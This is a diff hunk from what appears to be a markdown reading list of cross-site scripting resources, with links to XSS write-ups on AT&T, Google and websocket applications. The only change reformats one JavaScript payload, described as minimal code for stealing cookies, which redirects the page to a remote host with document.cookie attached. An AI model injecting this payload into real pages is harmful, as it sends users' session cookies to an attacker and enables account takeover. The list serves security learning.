@@ -38,7 +38,8 @@
 > 1.XSS payload by Dr. Mario
 >
 > 2.minimal code for stealing cookies and sending it to a remote server
-> document.location='https://ł.rip/save.php?c='+document.cookie;
+>
+     document.location='https://ł.rip/save.php?c='+document.cookie;
 - [Reflected XSS  in AT&T](https://medium.com/@godofdarkness.msf/reflected-xss-in-at-t-7f1bdd10d8f7)
 - [XSS on Google using Acunetix ](https://www.acunetix.com/blog/web-security-zone/xss-google-acunetix/)
 - [Exploiting websocket application wide XSS](https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa)
